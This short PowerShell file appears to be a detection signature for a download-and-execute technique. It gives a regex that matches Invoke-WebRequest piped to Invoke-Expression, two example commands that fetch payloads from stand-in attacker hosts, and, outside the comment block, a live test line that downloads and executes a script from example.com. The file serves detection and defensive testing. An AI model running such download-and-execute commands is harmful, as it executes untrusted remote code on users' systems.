<#
.SYNOPSIS
New PowerShell attack technique detection

.DESCRIPTION
This signature detects a new malicious PowerShell technique that uses Invoke-WebRequest to download and execute remote scripts with specific obfuscation patterns.

.SEVERITY
high

.CATEGORY
download-execute

.SCORE
85

.REGEX
Invoke-WebRequest\s+.*\|\s*Invoke-Expression|IWR\s+.*\|\s*IEX

.EXAMPLES
Invoke-WebRequest "http://malicious.com/script.ps1" | Invoke-Expression
IWR "https://evil.domain/payload" | IEX
#>

# This is a new test command to verify the automation workflow
Invoke-WebRequest "http://example.com/test.ps1" | Invoke-Expression
